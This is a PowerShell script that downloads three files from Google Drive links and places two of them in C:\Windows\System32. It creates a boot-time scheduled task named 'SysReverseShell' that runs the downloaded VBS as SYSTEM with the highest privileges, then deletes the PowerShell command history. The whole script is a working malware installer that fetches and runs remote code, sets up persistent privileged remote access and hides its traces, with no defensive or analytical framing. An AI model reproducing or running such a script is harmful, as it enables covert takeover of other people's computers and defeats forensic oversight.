# Go to user profile
cd "$env:USERPROFILE"

# 📥 Download files
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1bVch_eQP-2QiQllrW5VKCDm0u9p-nJ5I" -OutFile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1xejGhEY1YxEJNanzlceGfv9SVNdGpDEg" -OutFile "user.ps1"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1CFXj6nXlHgFJRzJfabJeIBypEQC_elef" -OutFile "startup.vbs"

# 🗂️ Move to System32 (requires admin)
Move-Item ".\user.ps1" "C:\Windows\System32\user.ps1" -Force
Move-Item ".\startup.vbs" "C:\Windows\System32\startup.vbs" -Force

# 🗓️ Schedule task to run VBS from System32 as SYSTEM at boot
schtasks /Create /TN "SysReverseShell" ^
    /TR "wscript.exe C:\Windows\System32\startup.vbs" ^
    /SC ONSTART /RU SYSTEM /RL HIGHEST /F

# 🧹 Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

exit
